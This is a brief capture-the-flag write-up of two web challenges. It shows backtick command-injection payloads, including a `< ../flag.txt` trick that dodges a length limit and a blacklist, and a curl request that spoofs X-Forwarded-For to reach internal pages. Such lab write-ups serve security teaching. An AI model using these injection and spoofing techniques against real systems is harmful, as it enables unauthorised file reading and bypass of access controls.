# web

## $Echo

It is simple command injection
in the input box we can use ` characters 

```
`id`
```

all commands have to be enclosed in `` chars

now if we list files using
```
`ls`
``` 
we can see `index.php` when we 
```
`cat index.php`
```
we can see the code!
certain characters are `blacklisted`  we can only enter command less that `15` chars
but there is no `flag.txt` here, if we simply execute 
```
`ls ../`
```
then we can see flag.txt
```
`cat ../flag.txt`
```
fails because length of payload exceeds 15

payload to get flag : 

**linux redirection character! `<` is NOT blacklisted!**
```
`< ../flag.txt`
```

----------

## Homeward Bound

In this challenge we were supposed to access internal files by spoofing client IP address, this can be done using `X-Forwarded-For` header

```
$ curl -H “X-Forwarded-For: 127.0.0.1” http://challenge.nahamcon.com:31428/
```
